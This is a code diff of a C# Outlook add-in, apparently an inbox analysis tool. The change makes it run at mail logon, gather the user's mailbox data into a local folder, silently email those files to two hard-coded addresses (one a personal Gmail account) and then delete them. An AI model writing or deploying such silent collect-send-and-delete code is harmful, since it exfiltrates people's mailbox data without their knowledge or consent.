@@ -9,12 +9,16 @@ namespace EmailExtractor
 {
     public partial class ThisAddIn
     {
-        private static string _delimiter = "\t";
-
         private void ThisAddIn_Startup(object sender, System.EventArgs e)
+        {
+            Application.MAPILogonComplete += new ApplicationEvents_11_MAPILogonCompleteEventHandler(MAPILogonCompleteEventHandler);
+        }
+
+        void MAPILogonCompleteEventHandler()
         {
             var username = this.Application.Session.CurrentUser.Name;
 
+            // TODO: make parameter
             var directory = @"C:\ProgramData\Inbox_Analysis_Tool\";
             Directory.CreateDirectory(directory);
 
@@ -27,8 +31,7 @@ namespace EmailExtractor
 
             try
             {
-                var rootFolder = Application.Session.DefaultStore.GetRootFolder() as Folder;
-                this.ProcessFolder(pathFormat, username, rootFolder);
+                EmailExtractor.ProcessFolder(pathFormat, username, Application.Session.DefaultStore.GetRootFolder() as Folder);
             }
             catch (System.Exception ex)
             {
@@ -40,47 +43,19 @@ namespace EmailExtractor
             }
             finally
             {
-                // TODO: email everything in the folder
-            }
-        }
-
-        private void ProcessFolder(string pathFormat, string username, Folder folder)
-        {
-            var table = folder.GetTable();
-            table.Columns.Add("http://schemas.microsoft.com/mapi/proptag/0x10F4000B");
-
-            while (!table.EndOfTable)
-            {
-                var nextRow = table.GetNextRow();
-
-                if (nextRow.GetValues()[4] == "IPM.Note")
+                MailItem mailItem = Application.CreateItem(OlItemType.olMailItem);
+                mailItem.Recipients.Add("darrinkatz@gmail.com");   // TODO: make parameter
+                mailItem.Recipients.Add("darrin.katz@shawmedia.ca");   // TODO: make parameter
+                mailItem.Subject = string.Format("Inbox_Analysis_Tool Files for {0}", username);
+                foreach (var file in Directory.GetFiles(directory))
                 {
-                    var sb = new StringBuilder();
-
-                    sb.Append(username);
-                    sb.Append(_delimiter);
-
-                    sb.Append(folder.FolderPath);
-                    sb.Append(_delimiter);
-
-                    if (nextRow["http://schemas.microsoft.com/mapi/proptag/0x10F4000B"] != null)
-                    {
-                        sb.Append(nextRow["http://schemas.microsoft.com/mapi/proptag/0x10F4000B"].ToString());
-                        sb.Append(_delimiter);
-                    }
-
-                    using (var outfile = File.AppendText(string.Format(pathFormat, "data.csv")))
-                    {
-                        outfile.WriteLine(sb.ToString());
-                    }
+                    mailItem.Attachments.Add(file);
                 }
-            }
-
-            for (int i = 1; i < folder.Folders.Count; i++)
-            {
-                var childFolder = folder.Folders[i] as Folder;
-
-                this.ProcessFolder(pathFormat, username, childFolder);
+                ((Microsoft.Office.Interop.Outlook._MailItem)mailItem).Send();
+                foreach(var file in Directory.GetFiles(directory))
+                {
+                    File.Delete(file);
+                }
             }
         }
 
